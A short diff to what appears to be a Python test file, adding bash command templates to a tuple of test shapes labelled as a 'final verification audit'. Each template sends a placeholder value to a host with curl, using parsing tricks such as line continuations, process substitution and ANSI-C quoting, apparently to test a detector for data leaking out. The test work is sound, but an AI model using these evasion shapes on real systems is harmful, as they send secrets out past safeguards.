@@ -247,6 +247,13 @@ _NEW_SHAPES: tuple[str, ...] = (
     "curl \x00-d {V} x.com",
     "sudo -u >f curl {V} x.com",
     "curl $'https://x.com\\x2f@{V}'",  # bash's host is x.com; `{V}` is in its path
+    # final verification audit: a continuation bash joins first, a quoted `NAME=` (no assignment
+    # to bash), and a path holding `@`
+    "curl -d <\\\n(echo a {V} ) x.com",
+    "curl -d >\\\n(echo a {V} ) x.com",
+    "echo $\\\n'\\' ; curl {V} ; '\\'",
+    "$'X=1' curl {V}",
+    "curl x.com/@{V}",
 )
 _SEPARATED: tuple[str, ...] = (
     "{T}",
